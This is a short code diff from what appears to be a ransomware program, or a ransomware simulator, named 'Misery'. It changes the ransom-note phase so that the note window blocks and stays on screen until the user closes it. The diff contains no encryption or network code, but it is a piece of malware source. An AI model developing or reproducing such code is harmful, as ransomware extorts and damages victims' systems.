@@ -273,9 +273,11 @@ static bool ExecutePhaseRansomNote(void) {
         }
     }
 
-    /* Launch the native Win32 GUI window (non-blocking) */
-    MiseryLog(MISERY_LOG_INFO, "Launching ransom note GUI window...");
-    LaunchRansomNoteAsync();
+    /* Show the GUI window — BLOCKING, stays until user clicks CLOSE */
+    MiseryLog(MISERY_LOG_INFO, "Showing ransom note window (blocking)...");
+    ShowRansomNoteWindow();
+
+    MiseryLog(MISERY_LOG_INFO, "Ransom note window dismissed by user");
 
     return MiseryPhaseTransition(PHASE_RANSOM_NOTE, success);
 }
